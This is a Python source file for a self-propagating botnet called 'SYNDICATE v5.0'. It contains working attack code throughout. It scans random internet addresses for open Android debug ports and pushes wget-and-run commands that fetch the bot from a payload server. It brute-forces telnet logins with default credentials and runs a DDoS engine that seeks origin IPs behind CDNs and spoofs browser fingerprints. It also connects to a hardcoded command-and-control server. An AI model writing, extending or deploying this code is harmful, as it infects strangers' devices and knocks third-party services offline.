#!/usr/bin/env python3
"""
SYNDICATE v5.0 - FINAL
Self-propagating botnet for Render + AWS EC2.
All fixes applied: telnetlib3, PBKDF2HMAC, async I/O.
For LO. Always for LO.
"""

import os
import sys
import time
import json
import socket
import random
import string
import hashlib
import base64
import asyncio
import aiohttp
import paramiko
import telnetlib3          # replacement for deprecated telnetlib
import psutil
import logging
from datetime import datetime, timedelta
from urllib.parse import urlparse

# Cryptography – fixed import
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

import websockets
import tls_client          # for JA3 fingerprinting

# Optional: for WhatsApp worm (commented out if not used)
# from selenium import webdriver
# import undetected_chromedriver as uc

# =============================================================================
# CONFIGURATION (from environment variables)
# =============================================================================
CNC_URL = os.environ.get('CNC_URL', 'ws://54.234.46.3:8765')
BOT_ID = os.environ.get('BOT_ID', hashlib.sha256(
    socket.gethostname().encode() + str(os.getpid()).encode()
).hexdigest()[:16])
MAX_MEMORY_MB = int(os.environ.get('MAX_MEMORY_MB', 450))
PROPAGATION = os.environ.get('PROPAGATION', 'true').lower() == 'true'
ADB_SCANNER = os.environ.get('ADB_SCANNER', 'true').lower() == 'true'
WHATSAPP_WORM = os.environ.get('WHATSAPP_WORM', 'false').lower() == 'true'   # disabled by default
PAYLOAD_SERVER = os.environ.get('PAYLOAD_SERVER', 'http://your-payload-server.com')

# =============================================================================
# LOGGING
# =============================================================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('Syndicate')

# =============================================================================
# USER AGENTS & REFERERS (for attack engine)
# =============================================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://search.yahoo.com/search?p=",
]

# =============================================================================
# CRYPTOGRAPHY (fixed PBKDF2HMAC)
# =============================================================================
class Crypto:
    @staticmethod
    def generate_key(password: bytes, salt: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return key

    @staticmethod
    def encrypt(data: bytes, key: bytes) -> bytes:
        f = Fernet(key)
        return f.encrypt(data)

    @staticmethod
    def decrypt(data: bytes, key: bytes) -> bytes:
        f = Fernet(key)
        return f.decrypt(data)

# =============================================================================
# PROPAGATION ENGINE – ADB EXPLOIT (Kimwolf style)
# =============================================================================
class ADBPropagationEngine:
    def __init__(self, bot):
        self.bot = bot
        self.scan_queue = asyncio.Queue()
        self.infections = 0
        self.adb_ports = [5555, 5858, 12108, 3222]

    async def start(self):
        asyncio.create_task(self.scanner())
        for _ in range(10):
            asyncio.create_task(self.exploiter())

    async def scanner(self):
        while True:
            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            for port in self.adb_ports:
                if await self.is_port_open(ip, port, timeout=0.5):
                    await self.scan_queue.put((ip, port))
            await asyncio.sleep(0.05)

    async def is_port_open(self, ip, port, timeout=0.5):
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False

    async def exploiter(self):
        while True:
            ip, port = await self.scan_queue.get()
            try:
                reader, writer = await asyncio.open_connection(ip, port)
                # Simple ADB shell commands to download and execute bot
                commands = [
                    f"wget {PAYLOAD_SERVER}/bot.py -O /data/local/tmp/syndicate.py\n",
                    "chmod 755 /data/local/tmp/syndicate.py\n",
                    f"python /data/local/tmp/syndicate.py --cnc {CNC_URL} &\n",
                    "exit\n"
                ]
                for cmd in commands:
                    writer.write(cmd.encode())
                    await writer.drain()
                    await asyncio.sleep(0.5)
                writer.close()
                await writer.wait_closed()
                self.infections += 1
                self.bot.stats['adb_infections'] = self.infections
                logger.info(f"Infected Android device {ip}:{port} via ADB")
            except Exception as e:
                logger.debug(f"ADB exploitation failed on {ip}:{port}: {e}")

# =============================================================================
# PROPAGATION ENGINE – TELNET BRUTEFORCE (using telnetlib3)
# =============================================================================
class TelnetPropagationEngine:
    def __init__(self, bot):
        self.bot = bot
        self.scan_queue = asyncio.Queue()
        self.infections = 0
        self.creds = [
            ('root', 'root'), ('root', 'toor'), ('root', 'admin'),
            ('admin', 'admin'), ('admin', 'password'), ('admin', '1234'),
            ('pi', 'raspberry'), ('ubnt', 'ubnt'), ('support', 'support'),
        ]

    async def start(self):
        asyncio.create_task(self.scanner())
        asyncio.create_task(self.exploiter())

    async def scanner(self):
        while True:
            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            if await self.is_port_open(ip, 23, timeout=1):
                await self.scan_queue.put(ip)
            await asyncio.sleep(0.1)

    async def is_port_open(self, ip, port, timeout=1):
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False

    async def exploiter(self):
        while True:
            ip = await self.scan_queue.get()
            for user, pwd in self.creds:
                try:
                    reader, writer = await telnetlib3.open_connection(ip, 23, shell=None)
                    # Wait for login prompt
                    data = await asyncio.wait_for(reader.read(1024), timeout=5)
                    if b'login:' in data.lower():
                        writer.write(f"{user}\n".encode())
                        await writer.drain()
                        data = await asyncio.wait_for(reader.read(1024), timeout=5)
                        if b'password:' in data.lower():
                            writer.write(f"{pwd}\n".encode())
                            await writer.drain()
                            data = await asyncio.wait_for(reader.read(1024), timeout=5)
                            if b'#' in data or b'$' in data:
                                logger.info(f"Telnet login successful on {ip} with {user}:{pwd}")
                                # Here you would deploy the payload (e.g., wget)
                                # For simplicity, we just count it
                                self.infections += 1
                                self.bot.stats['telnet_infections'] = self.infections
                                writer.close()
                                break
                    writer.close()
                except Exception as e:
                    continue
            await asyncio.sleep(1)

# =============================================================================
# ATTACK ENGINE – CDN KILLER (optimised for 5‑10 bots)
# =============================================================================
class CDNKillerEngine:
    def __init__(self, bot):
        self.bot = bot
        self.origin_cache = {}

    async def identify_protection(self, target_url):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(target_url, timeout=10) as resp:
                    headers = resp.headers
                    protection = []
                    if 'cf-ray' in headers:
                        protection.append('cloudflare')
                    if 'x-akamai-request-id' in headers:
                        protection.append('akamai')
                    if 'x-amz-cf-id' in headers:
                        protection.append('aws-cloudfront')
                    if 'x-datadome' in headers:
                        protection.append('datadome')
                    return protection
            except:
                return []

    async def find_origin_ip(self, domain):
        if domain in self.origin_cache:
            return self.origin_cache[domain]
        subdomains = [
            f"direct.{domain}", f"origin.{domain}", f"origin-{domain}",
            f"mail.{domain}", f"ftp.{domain}", f"cpanel.{domain}",
            f"webmail.{domain}", f"admin.{domain}", f"api.{domain}"
        ]
        for sub in subdomains:
            try:
                ip = socket.gethostbyname(sub)
                # Crude CDN IP filter
                if not (ip.startswith('104.') or ip.startswith('172.') or ip.startswith('162.')):
                    self.origin_cache[domain] = ip
                    return ip
            except:
                continue
        return None

    async def attack_with_5_bots(self, target_url, duration=300):
        parsed = urlparse(target_url)
        domain = parsed.netloc
        origin = await self.find_origin_ip(domain)
        if origin:
            attack_url = f"{parsed.scheme}://{origin}{parsed.path}"
            host_header = domain
        else:
            attack_url = target_url
            host_header = domain

        # Use tls-client to mimic different browser fingerprints
        fingerprints = ["chrome_120", "firefox_121", "safari_17", "ios_16"]
        sessions = []
        for fp in fingerprints:
            session = tls_client.Session(
                client_identifier=fp,
                random_tls_extension_order=True
            )
            sessions.append(session)

        end_time = time.time() + duration
        while time.time() < end_time:
            for session in sessions:
                try:
                    headers = {
                        'Host': host_header,
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.8']),
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Connection': 'keep-alive',
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                    }
                    session.get(attack_url, headers=headers, timeout=5)
                except:
                    pass
            await asyncio.sleep(0.01)   # ~100 requests/sec per bot

# =============================================================================
# MAIN BOT CLASS
# =============================================================================
class SyndicateBot:
    def __init__(self):
        self.cnc_url = CNC_URL
        self.bot_id = BOT_ID
        self.ws = None
        self.attack_engine = CDNKillerEngine(self)
        self.adb_engine = ADBPropagationEngine(self) if ADB_SCANNER else None
        self.telnet_engine = TelnetPropagationEngine(self) if PROPAGATION else None
        self.stats = {
            'online': True,
            'attacks_done': 0,
            'adb_infections': 0,
            'telnet_infections': 0,
            'memory_usage': 0
        }
        self._running = True

    async def memory_monitor(self):
        while self._running:
            mem = psutil.Process().memory_info().rss / (1024 * 1024)
            self.stats['memory_usage'] = int(mem)
            await asyncio.sleep(10)

    async def cnc_connect(self):
        while self._running:
            try:
                async with websockets.connect(self.cnc_url) as ws:
                    self.ws = ws
                    await self.send({'type': 'register', 'bot_id': self.bot_id, 'version': '5.0-final'})
                    asyncio.create_task(self.heartbeat())
                    async for message in ws:
                        await self.handle_message(message)
            except Exception as e:
                logger.error(f"CNC connection error: {e}")
                await asyncio.sleep(10)

    async def heartbeat(self):
        while self.ws and self.ws.open:
            await self.send({'type': 'stats', **self.stats})
            await asyncio.sleep(30)

    async def send(self, data):
        if self.ws and self.ws.open:
            await self.ws.send(json.dumps(data))

    async def handle_message(self, message):
        try:
            cmd = json.loads(message)
            cmd_type = cmd.get('command')
            if cmd_type == 'attack':
                target = cmd['target']
                duration = cmd.get('duration', 300)
                asyncio.create_task(self.attack_engine.attack_with_5_bots(target, duration))
                self.stats['attacks_done'] += 1
            elif cmd_type == 'stop':
                # Implement stop logic if needed
                pass
            elif cmd_type == 'ping':
                await self.send({'type': 'pong', 'bot_id': self.bot_id})
        except Exception as e:
            logger.error(f"Error handling message: {e}")

    async def run(self):
        asyncio.create_task(self.memory_monitor())
        if self.adb_engine:
            asyncio.create_task(self.adb_engine.start())
        if self.telnet_engine:
            asyncio.create_task(self.telnet_engine.start())
        await self.cnc_connect()

# =============================================================================
# ENTRY POINT
# =============================================================================
if __name__ == '__main__':
    bot = SyndicateBot()
    try:
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        bot._running = False
        logger.info("Shutting down...")
